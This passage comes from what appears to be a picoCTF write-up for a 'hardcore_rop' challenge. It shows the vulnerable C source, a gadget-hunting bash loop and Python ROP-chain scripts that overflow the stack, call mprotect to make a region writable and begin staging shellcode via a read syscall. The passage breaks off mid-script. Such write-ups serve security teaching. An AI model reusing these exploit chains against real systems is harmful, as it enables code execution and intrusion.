</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">66</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;ROP time!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">x</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">do</span> <span class="n">x</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="n">count</span><span class="p">,</span> <span class="mi">555</span><span class="o">-</span><span class="n">count</span><span class="p">);</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">count</span> <span class="o">+=</span> <span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">555</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)[</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">chdir</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">stat</span><span class="p">(</span><span class="s">&quot;./flag&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;oops, problem set up wrong D:&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;yo, what&#39;s up?&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">alarm</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>      <span class="n">randop</span><span class="p">();</span>
</span><span class='line'>      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="n">seed</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAPLEN</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">66</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">size_t</span> <span class="n">x</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">do</span> <span class="n">x</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="n">count</span><span class="p">,</span> <span class="mi">555</span><span class="o">-</span><span class="n">count</span><span class="p">);</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">count</span> <span class="o">+=</span> <span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">555</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)[</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span><span class="o">(</span><span class="nb">echo </span>7777<span class="p">;</span> python -c <span class="s1">&#39;print &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&quot;&#39;</span><span class="o">)</span> <span class="p">|</span> ./hardcore_rop <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</span><span class='line'>yo, what<span class="s1">&#39;s up?</span>
</span><span class='line'><span class="s1">ROP time!</span>
</span><span class='line'><span class="s1">Segmentation fault (core dumped)</span>
</span><span class='line'><span class="s1">bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core</span>
</span><span class='line'><span class="s1">GNU gdb (GDB) 7.4.1-debian</span>
</span><span class='line'><span class="s1">...</span>
</span><span class='line'><span class="s1">Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>

<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">read </span>i<span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  <span class="o">(</span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&quot;</span><span class="o">)</span> <span class="p">|</span> ./hardcore_rop <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</span><span class='line'>  dd <span class="k">if</span><span class="o">=</span>core <span class="nv">of</span><span class="o">=</span>region <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">4096</span> <span class="nv">count</span><span class="o">=</span>40960
</span><span class='line'>  xxd -c <span class="m">1</span> region <span class="p">|</span> awk <span class="o">{</span><span class="s1">&#39;print $1 $2&#39;</span><span class="o">}</span> <span class="p">|</span>sort -r &gt; dump.txt
</span><span class='line'>  python ./ropgadget.py -i bleh -d <span class="m">10</span> &gt; <span class="nv">$i</span>-gadgets.txt
</span><span class='line'>
</span><span class='line'>  cat <span class="nv">$i</span>-gadgets.txt <span class="p">|</span>egrep <span class="s1">&#39;int 0x80&#39;</span>
</span><span class='line'>  rm core
</span><span class='line'>  rm dump.txt
</span><span class='line'><span class="k">done</span> &lt; digits.txt
</span></code></pre></td></tr></table></div></figure>


<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span>grep <span class="s2">&quot;int 0x80&quot;</span> *
</span><span class='line'>0347-gadgets.txt:RET: 0x0000d64: int 0x80<span class="p">;</span> lahf<span class="p">;</span> ret<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># RET: 0x000913f: pop eax; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0003c7e: pop ecx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0002393: pop edx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x000964d: pop ebx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0000d64: int 0x80; lahf; ret;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I wrote the following ROP chain:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">BASE</span> <span class="o">=</span> <span class="mh">0xf000000</span>
</span><span class='line'><span class="c"># RET: 0x000913f: pop eax; ret;</span>
</span><span class='line'><span class="n">popeax</span> <span class="o">=</span> <span class="mh">0x000913f</span>
</span><span class='line'><span class="c"># RET: 0x0003c7e: pop ecx; ret;</span>
</span><span class='line'><span class="n">popecx</span> <span class="o">=</span> <span class="mh">0x0003c7e</span>
</span><span class='line'><span class="c"># RET: 0x0002393: pop edx; ret;</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="mh">0x0002393</span>
</span><span class='line'><span class="c"># RET: 0x000964d: pop ebx; ret;</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="mh">0x000964d</span>
</span><span class='line'><span class="c"># RET: 0x0000569: pop edi; ret;</span>
</span><span class='line'><span class="n">popedi</span> <span class="o">=</span> <span class="mh">0x0000569</span>
</span><span class='line'><span class="c"># RET: 0x0000d64: int 0x80; lahf; ret;</span>
</span><span class='line'><span class="n">int80h</span> <span class="o">=</span> <span class="mh">0x0000d64</span>
</span><span class='line'><span class="c"># RET: 0x0001b11: int3; ret;</span>
</span><span class='line'><span class="n">int03h</span> <span class="o">=</span> <span class="mh">0x0001b11</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># seed value</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;0347</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># syscall number 125 in eax (mprotect)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">125</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to memory region in ebx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># memory flags PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># length in ecx, needs to be multiple of 2</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># stage2 test</span>
</span><span class='line'><span class="c"># edi = 0xf000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedi</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># edx = 0xcccccccc (four times int 0x3)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xcccccccc</span><span class="p">)</span>
</span><span class='line'><span class="c"># RET: 0x0002770: mov [edi], dh; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="mh">0x0002770</span><span class="p">)</span>
</span><span class='line'><span class="c"># return to 0xf000000, which should contain an int 0x3</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span><span class='line'><span class="c">## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>

<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">BASE</span> <span class="o">=</span> <span class="mh">0xf000000</span>
</span><span class='line'><span class="n">popeax</span> <span class="o">=</span> <span class="mh">0x000913f</span>
</span><span class='line'><span class="n">popecx</span> <span class="o">=</span> <span class="mh">0x0003c7e</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="mh">0x0002393</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="mh">0x000964d</span>
</span><span class='line'><span class="n">popedi</span> <span class="o">=</span> <span class="mh">0x0000569</span>
</span><span class='line'><span class="n">int80h</span> <span class="o">=</span> <span class="mh">0x0000d64</span>
</span><span class='line'><span class="n">int03h</span> <span class="o">=</span> <span class="mh">0x0001b11</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># seed value</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;0347</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># eax = syscall_mprotect</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">125</span><span class="p">)</span>
</span><span class='line'><span class="c"># pointer to memory region in ebx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># memory flags PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'><span class="c"># length in ecx, needs to be multiple of 2</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># eax = syscall_read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="c"># ecx = ptr to BASE</span>
